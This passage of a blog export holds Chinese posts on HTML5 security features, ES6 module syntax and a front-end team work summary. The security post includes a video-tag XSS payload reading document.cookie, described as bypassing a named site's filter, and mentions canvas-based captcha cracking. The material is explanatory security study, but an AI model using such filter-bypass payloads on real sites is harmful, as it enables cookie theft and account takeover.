<h2 id="HTML5新标签"><a href="#HTML5新标签" class="headerlink" title="HTML5新标签"></a>HTML5新标签</h2><p>一些XSS Filter如果建立了一个黑名单的话，可能覆盖不到HTML5新增的标签和功能。</p>
<p>如video可以远程加载一段视频，audio标签也类似。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"http://file.ogg"</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(document.cookie);"</span>  <span class="attr">ondurationchanged</span>=<span class="string">"alert(/xss2)"</span> <span class="attr">ontimeupdate</span>=<span class="string">"alert(/xss1/);"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以成功绕过百度空间的XSS Filter。</p>
<h2 id="iframe的sandbox"><a href="#iframe的sandbox" class="headerlink" title="iframe的sandbox"></a>iframe的sandbox</h2><p>在HTML5中，专门为<code>&lt;iframe&gt;</code>定义了一个新的属性，叫sandbox。使用sandbox这个属性，<code>&lt;iframe&gt;</code>标签加载的内容将被视为一个独立的”源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。</p>
<p>sandbox属性可以通过参数来支持更精确的控制。有以下几个值可以选择：</p>
<p>1.allow-same-origin: 允许同源访问<br>2.allow-top-navigation: 允许访问顶层窗口<br>3.allow-forms: 允许提交表单<br>4.allow-script: 允许执行脚本</p>
<p>有的行为即使设置了allow-scripts，也是不允许的，比如”弹出窗口“</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>毫无疑问，iframe的sandox属性将极大地增强应用使用iframe的安全性。</p>
<h2 id="Link-Types-noreferrer"><a href="#Link-Types-noreferrer" class="headerlink" title="Link Types: noreferrer"></a>Link Types: noreferrer</h2><p>在HTML5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Types: noreferrer。</p>
<p>浏览器在请求该标签指定的地址时将不再发送Referer。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"xxx"</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种设计是出于保护敏感信息和隐私的考虑。</p>
<h2 id="Canvas的妙用"><a href="#Canvas的妙用" class="headerlink" title="Canvas的妙用"></a>Canvas的妙用</h2><p>canvas可以让javascript在页面中直接操作图片对象，也可以直接操作像素。</p>
<p>所以完全可以用canvas实现简单的验证码破解功能，在浏览器中实现在线破解，这大大降低了攻击门槛。</p>
<h2 id="其他安全问题"><a href="#其他安全问题" class="headerlink" title="其他安全问题"></a>其他安全问题</h2><h2 id="Cross-Origin-Resource-Sharing"><a href="#Cross-Origin-Resource-Sharing" class="headerlink" title="Cross-Origin Resource Sharing"></a>Cross-Origin Resource Sharing</h2><p>W3C委员制定了一个新标准来解决跨域访问问题。</p>
<p>假设从<code>http://www.a.com/test.html</code>发起一个跨域的XMLHttpRequest请求，请求的地址为：<code>http://www.b.com/test.php</code></p>
<p>如果服务器<a href="http://www.b.com返回一个HTTP" target="_blank" rel="noopener">www.b.com返回一个HTTP</a> Header:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.a.conm</span><br></pre></td></tr></table></figure>
<p>这个跨域请求就会被通过。</p>
<p>在这个过程中，<code>http://www.a.com/test.html</code>发起的请求浏览器还会自动带上一个Origin Header</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Origin: http://www.a.com</span><br></pre></td></tr></table></figure>
<p>它可以用于防范CSRF攻击。</p>
<p>当然对于这个标准，还有很多http header可以用于更精确的控制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Syntax</span><br><span class="line"></span><br><span class="line">response header:</span><br><span class="line"></span><br><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Max-Age</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Allow-Methods</span><br><span class="line">Access-Control-Allow-Headers</span><br><span class="line"></span><br><span class="line">request header:</span><br><span class="line"></span><br><span class="line">Origin</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Access-Control-Request-Headers</span><br></pre></td></tr></table></figure>
<h2 id="postMessage——跨窗口传递消息"><a href="#postMessage——跨窗口传递消息" class="headerlink" title="postMessage——跨窗口传递消息"></a>postMessage——跨窗口传递消息</h2><p>postMessage允许每一个window(包括当前窗口、弹出窗口、iframes等)对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。</p>
<p>所以在使用postMessage时，有两个安全问题需要注意。</p>
<p>1.在必要时，可以在接收窗口验证Domain，甚至是URL，以防止来自非法页面的消息。</p>
<p>2.如果是将消息写入innerHTML，则可能导致DOM based XSS的产生。根据”Secure By Default“原则，应该对消息进行安全检查。</p>
<h2 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h2><p>过去浏览器通用化的存储信息的方法只有Cookie，Cookie主要用于保存登录凭证和少量信息，其最大长度的限制决定了不可能存储太多信息，而Web Storage可以。</p>
<p>Web Storage分为Session Storage和Local Storage。Session Storage关闭浏览器会失效，而Local Storage则会一直存在。它就向一个非关系型数据库，由Key-Value对组成，使用js方法window.sessionStorage.setItem(key, value)和window.sessionStorage.getItem(key)可以存取值。</p>
<p>Web Storage也受同源策略的约束，每个域所拥有的信息只会保存在自己的域下。</p>
<p>Web Storage的强大功能也为XSS Payload大开方便之门。攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>es6-Module的语法</title>
    <url>/2020/05/27/es6-Module%E7%9A%84%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>es6-Module 的语法</p>
<a id="more"></a>
<h1 id="Module-的语法"><a href="#Module-的语法" class="headerlink" title="Module 的语法"></a>Module 的语法</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。</p>
<p>ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CommonJS模块</span></span><br><span class="line"><span class="keyword">let</span> &#123; stat, exists, readfile &#125; = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">let</span> _fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">let</span> stat = _fs.stat;</span><br><span class="line"><span class="keyword">let</span> exists = _fs.exists;</span><br><span class="line"><span class="keyword">let</span> readfile = _fs.readfile;</span><br></pre></td></tr></table></figure>
<p>上面代码的实质是整体加载 fs 模块（即加载 fs 的所有方法），生成一个对象（_fs），然后再从这个对象上面读取 3 个方法。这种加载称为“运行时加载”，因为只有运行时才能得到这个对象，导致完全没办法在编译时做“静态优化”。</p>
<p>ES6 模块不是对象，而是通过 export 命令显式指定输出的代码，再通过 import 命令输入。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; stat, exists, readFile &#125; <span class="keyword">from</span> <span class="string">"fs"</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码的实质是从 fs 模块加载 3 个方法，其他方法不加载。这种加载称为“编译时加载”或者静态加载，即 ES6 可以在编译时就完成模块加载，效率要比 CommonJS 模块的加载方式高。当然，这也导致了没法引用 ES6 模块本身，因为它不是对象。</p>
<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>ES6 的模块自动采用严格模式，不管你有没有在模块头部加上”use strict”;。</p>
<h2 id="export-命令"><a href="#export-命令" class="headerlink" title="export 命令"></a>export 命令</h2><p>export 命令用于规定模块的对外接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> firstName = <span class="string">"Michael"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> lastName = <span class="string">"Jackson"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> year = <span class="number">1958</span>;</span><br></pre></td></tr></table></figure>
<p>可以使用 as 关键字重命名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v1</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v2</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  v1 <span class="keyword">as</span> streamV1,</span><br><span class="line">  v2 <span class="keyword">as</span> streamV2,</span><br><span class="line">  v2 <span class="keyword">as</span> streamLatestVersion</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>export 语句输出的接口，与其对应的值是动态绑定关系。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> foo = <span class="string">"bar"</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> (foo = <span class="string">"baz"</span>), <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码输出变量 foo，值为 bar，500 毫秒之后变成 baz。<br>这一点与 CommonJS 规范完全不同。CommonJS 模块输出的是值的缓存，不存在动态更新</p>
<p>最后，export 命令可以出现在模块的任何位置，只要处于模块顶层就可以。如果处于块级作用域内，就会报错，import 命令也是如此。这是因为处于条件代码块之中，就没法做静态优化了，违背了 ES6 模块的设计初衷。</p>
<h2 id="import-命令"><a href="#import-命令" class="headerlink" title="import 命令"></a>import 命令</h2><p>通过 import 命令加载模块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lastName <span class="keyword">as</span> surname &#125; <span class="keyword">from</span> <span class="string">"./profile.js"</span>;</span><br></pre></td></tr></table></figure>
<p>import 命令具有提升效果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">"my_module"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="模块的整体加载"><a href="#模块的整体加载" class="headerlink" title="模块的整体加载"></a>模块的整体加载</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> circle <span class="keyword">from</span> <span class="string">"./circle"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="export-default-命令"><a href="#export-default-命令" class="headerlink" title="export default 命令"></a>export default 命令</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"foo"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入</span></span><br><span class="line"><span class="keyword">import</span> crc32 <span class="keyword">from</span> <span class="string">"crc32"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="export-与-import-的复合写法"><a href="#export-与-import-的复合写法" class="headerlink" title="export 与 import 的复合写法"></a>export 与 import 的复合写法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">"my_module"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以简单理解为</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">"my_module"</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; foo, bar &#125;;</span><br></pre></td></tr></table></figure>
<h2 id="模块的继承"><a href="#模块的继承" class="headerlink" title="模块的继承"></a>模块的继承</h2><p>假设有一个 circleplus 模块，继承了 circle 模块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// circleplus.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">"circle"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> e = <span class="number">2.71828182846</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.exp(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="import"><a href="#import" class="headerlink" title="import()"></a>import()</h2><p>require 是运行时加载模块，import 命令无法取代 require 的动态加载功能。ES2020 提案 引入 import()函数，支持动态加载模块。<br>import()返回一个 Promise 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> main = <span class="built_in">document</span>.querySelector(<span class="string">"main"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(<span class="string">`./section-modules/<span class="subst">$&#123;someVariable&#125;</span>.js`</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">module</span>.loadPageInto(main);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    main.textContent = err.message;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>import()类似于 Node 的 require 方法，区别主要是前者是异步加载，后者是同步加载。</p>
<h1 id="Module-的加载实现"><a href="#Module-的加载实现" class="headerlink" title="Module 的加载实现"></a>Module 的加载实现</h1><h2 id="浏览器加载"><a href="#浏览器加载" class="headerlink" title="浏览器加载"></a>浏览器加载</h2><p><code>&lt;script&gt;</code>标签打开 defer 或 async 属性，脚本就会异步加载。<br>defer 与 async 的区别是：defer 要等到整个页面在内存中正常渲染结束（DOM 结构完全生成，以及其他脚本执行完成），才会执行；async 一旦下载完，渲染引擎就会中断渲染，执行这个脚本以后，再继续渲染。一句话，defer 是“渲染完再执行”，async 是“下载完就执行”。另外，如果有多个 defer 脚本，会按照它们在页面出现的顺序加载，而多个 async 脚本是不能保证加载顺序的。</p>
<p>浏览器加载 ES6 模块，也使用<code>&lt;script&gt;</code>标签，但是要加入 type=”module”属性。<br>带有 type=”module”的<code>&lt;script&gt;</code>，都是异步加载，不会造成堵塞浏览器，即等到整个页面渲染完，再执行模块脚本，等同于打开了<code>&lt;script&gt;</code>标签的 defer 属性。</p>
<p><code>&lt;script&gt;</code>标签的 async 属性也可以打开，这时只要加载完成，渲染引擎就会中断渲染立即执行。执行完成后，再恢复渲染。</p>
<h2 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h2><p>它们有两个重大差异</p>
<ol>
<li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li>
<li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li>
</ol>
<p>第二个差异是因为 CommonJS 加载的是一个对象（即 module.exports 属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。</p>
<p>第一个差异。CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。</p>
<h2 id="Node-js-加载"><a href="#Node-js-加载" class="headerlink" title="Node.js 加载"></a>Node.js 加载</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>Node.js 对 ES6 模块的处理比较麻烦，因为它有自己的 CommonJS 模块格式，与 ES6 模块格式是不兼容的。目前的解决方案是，将两者分开，ES6 模块和 CommonJS 采用各自的加载方案。从 v13.2 版本开始，Node.js 已经默认打开了 ES6 模块支持。</p>
<p>.mjs 文件总是以 ES6 模块加载，.cjs 文件总是以 CommonJS 模块加载，.js 文件的加载取决于 package.json 里面 type 字段的设置。</p>
<h3 id="main-字段"><a href="#main-字段" class="headerlink" title="main 字段"></a>main 字段</h3><p>package.json 文件有两个字段可以指定模块的入口文件：main 和 exports。比较简单的模块，可以只使用 main 字段，指定模块加载的入口文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./node_modules/es-module-package/package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"type"</span>: <span class="string">"module"</span>,</span><br><span class="line">  <span class="string">"main"</span>: <span class="string">"./src/index.js"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码指定项目的入口脚本为./src/index.js，它的格式为 ES6 模块。如果没有 type 字段，index.js 就会被解释为 CommonJS 模块。</p>
<h2 id="exports-字段"><a href="#exports-字段" class="headerlink" title="exports 字段"></a>exports 字段</h2><p>exports 字段的优先级高于 main 字段。它有多种用法。<br>(1）子目录别名</p>
<p>package.json 文件的 exports 字段可以指定脚本或子目录的别名。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./node_modules/es-module-package/package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"exports"</span>: &#123;</span><br><span class="line">    <span class="attr">"./submodule"</span>: <span class="string">"./src/submodule.js"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码指定 src/submodule.js 别名为 submodule，然后就可以从别名加载这个文件。<br>（2）main 的别名<br>exports 字段的别名如果是.，就代表模块的主入口，优先级高于 main 字段，并且可以直接简写成 exports 字段的值。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"exports"</span>: &#123;</span><br><span class="line">    <span class="attr">"."</span>: <span class="string">"./main.js"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"exports"</span>: <span class="string">"./main.js"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（3）条件加载<br>利用.这个别名，可以为 ES6 模块和 CommonJS 指定不同的入口。目前，这个功能需要在 Node.js 运行的时候，打开–experimental-conditional-exports 标志。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"type"</span>: <span class="string">"module"</span>,</span><br><span class="line">  <span class="attr">"exports"</span>: &#123;</span><br><span class="line">    <span class="attr">"."</span>: &#123;</span><br><span class="line">      <span class="attr">"require"</span>: <span class="string">"./main.cjs"</span>,</span><br><span class="line">      <span class="attr">"default"</span>: <span class="string">"./main.js"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ES6-模块加载-CommonJS-模块"><a href="#ES6-模块加载-CommonJS-模块" class="headerlink" title="ES6 模块加载 CommonJS 模块"></a>ES6 模块加载 CommonJS 模块</h3><p>目前，一个模块同时支持 ES6 和 CommonJS 两种格式的常见方法是，package.json 文件的 main 字段指定 CommonJS 入口，给 Node.js 使用；module 字段指定 ES6 模块入口，给打包工具使用，因为 Node.js 不认识 module 字段。</p>
<p>有了上一节的条件加载以后，Node.js 本身就可以同时处理两种模块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./node_modules/pkg/package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"type"</span>: <span class="string">"module"</span>,</span><br><span class="line">  <span class="string">"main"</span>: <span class="string">"./index.cjs"</span>,</span><br><span class="line">  <span class="string">"exports"</span>: &#123;</span><br><span class="line">    <span class="string">"require"</span>: <span class="string">"./index.cjs"</span>,</span><br><span class="line">    <span class="string">"default"</span>: <span class="string">"./wrapper.mjs"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ES6 模块可以加载这个文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./node_modules/pkg/wrapper.mjs</span></span><br><span class="line"><span class="keyword">import</span> cjsModule <span class="keyword">from</span> <span class="string">"./index.cjs"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = cjsModule.name;</span><br></pre></td></tr></table></figure>
<p>import 命令加载 CommonJS 模块，只能整体加载，不能只加载单一的输出项。</p>
<p>还有一种变通的加载方法，就是使用 Node.js 内置的 module.createRequire()方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cjs.cjs</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="string">"cjs"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// esm.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; createRequire &#125; <span class="keyword">from</span> <span class="string">"module"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">require</span> = createRequire(<span class="keyword">import</span>.meta.url);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cjs = <span class="built_in">require</span>(<span class="string">"./cjs.cjs"</span>);</span><br><span class="line">cjs === <span class="string">"cjs"</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="CommonJS-模块加载-ES6-模块"><a href="#CommonJS-模块加载-ES6-模块" class="headerlink" title="CommonJS 模块加载 ES6 模块"></a>CommonJS 模块加载 ES6 模块</h3><p>CommonJS 的 require 命令不能加载 ES6 模块，会报错，只能使用 import()这个方法加载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">"./my-app.mjs"</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="Node-js-的内置模块"><a href="#Node-js-的内置模块" class="headerlink" title="Node.js 的内置模块"></a>Node.js 的内置模块</h3><p>Node.js 的内置模块可以整体加载，也可以加载指定的输出项。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 整体加载</span></span><br><span class="line"><span class="keyword">import</span> EventEmitter <span class="keyword">from</span> <span class="string">"events"</span>;</span><br><span class="line"><span class="keyword">const</span> e = <span class="keyword">new</span> EventEmitter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载指定的输出项</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFile &#125; <span class="keyword">from</span> <span class="string">"fs"</span>;</span><br><span class="line">readFile(<span class="string">"./foo.txt"</span>, (err, source) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(source);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="循环加载"><a href="#循环加载" class="headerlink" title="循环加载"></a>循环加载</h2><h3 id="CommonJS-模块的循环加载"><a href="#CommonJS-模块的循环加载" class="headerlink" title="CommonJS 模块的循环加载"></a>CommonJS 模块的循环加载</h3><p>CommonJS 的一个模块，就是一个脚本文件。require 命令第一次加载该脚本，就会执行整个脚本，然后在内存生成一个对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  id: <span class="string">'...'</span>,</span><br><span class="line">  exports: &#123; ... &#125;,</span><br><span class="line">  loaded: <span class="literal">true</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以后需要用到这个模块的时候，就会到 exports 属性上面取值。即使再次执行 require 命令，也不会再次执行该模块，而是到缓存之中取值。</p>
<p>CommonJS 模块的重要特性是加载时执行，即脚本代码在 require 的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。</p>
<h3 id="ES6-模块的循环加载"><a href="#ES6-模块的循环加载" class="headerlink" title="ES6 模块的循环加载"></a>ES6 模块的循环加载</h3><p>ES6 处理“循环加载”与 CommonJS 有本质的不同。ES6 模块是动态引用，如果使用 import 从一个模块加载变量（即 import foo from ‘foo’），那些变量不会被缓存，而是成为一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值。</p>
<p>请看下面这个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; bar &#125; <span class="keyword">from</span> <span class="string">"./b"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a.mjs"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(bar);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> foo = <span class="string">"foo"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">"./a"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"b.mjs"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> bar = <span class="string">"bar"</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，a.mjs 加载 b.mjs，b.mjs 又加载 a.mjs，构成循环加载。执行 a.mjs，结果如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ node --experimental-modules a.mjs</span><br><span class="line">b.mjs</span><br><span class="line">ReferenceError: foo is not defined</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title>es6-let和const命令</title>
    <url>/2020/05/29/es6-let%E5%92%8Cconst%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>es6-let 和 const 命令 1</p>
<a id="more"></a>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title>react的diff算法</title>
    <url>/2020/06/03/react%E7%9A%84diff%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>123</p>
<a id="more"></a>
<h2 id="主要项目支持"><a href="#主要项目支持" class="headerlink" title="主要项目支持"></a>主要项目支持</h2><ol>
<li>数据资产-元数据</li>
<li>数据增长-埋点可视化 Chrome 插件</li>
<li>数据基础-算法平台</li>
<li>数据基础-计算平台(进行中)</li>
</ol>
<h2 id="工程现状"><a href="#工程现状" class="headerlink" title="工程现状"></a>工程现状</h2><h3 id="开发流程明确"><a href="#开发流程明确" class="headerlink" title="开发流程明确"></a>开发流程明确</h3><p>需求文档-&gt;排期-&gt;接口文档-&gt;开发-&gt;联调-&gt;测试-&gt;上线</p>
<h3 id="中后台开发体系趋于成熟"><a href="#中后台开发体系趋于成熟" class="headerlink" title="中后台开发体系趋于成熟"></a>中后台开发体系趋于成熟</h3><ol>
<li>技术选型：react(框架)+zan-shuai(基于 redux 的状态管理)+koa(node.js 中间层)+fun 或 ant design(组件库)+BizCharts(图表库)</li>
<li>代码编写模块拆分明确</li>
</ol>
<h3 id="主流框架理解加深"><a href="#主流框架理解加深" class="headerlink" title="主流框架理解加深"></a>主流框架理解加深</h3><ol>
<li>react《深入 react 技术栈》</li>
<li>Vue《Vue.js 项目实战》、《深入浅出 Vue.js》</li>
</ol>
<h3 id="可搭建定制化工程"><a href="#可搭建定制化工程" class="headerlink" title="可搭建定制化工程"></a>可搭建定制化工程</h3><p>埋点 chrome 插件项目：自建脚手架、全面使用 react hook（最新的开发模式）</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>工程上存在部分问题，有时间会优化</p>
<ol>
<li>元数据(历史问题)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.1 样式通过style分散在标签中(主要问题)</span><br><span class="line">1.2 部分功能未组件化</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>算法平台</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.1 数据管理写在了一个文件里，未拆分</span><br><span class="line">2.2 组件未分层拆分</span><br></pre></td></tr></table></figure>
<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ol>
<li>可视化自研能力培养(d3.js、three.js)</li>
<li>新项目使用 typescript</li>
</ol>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ol>
<li>需求需明确是否有意义</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
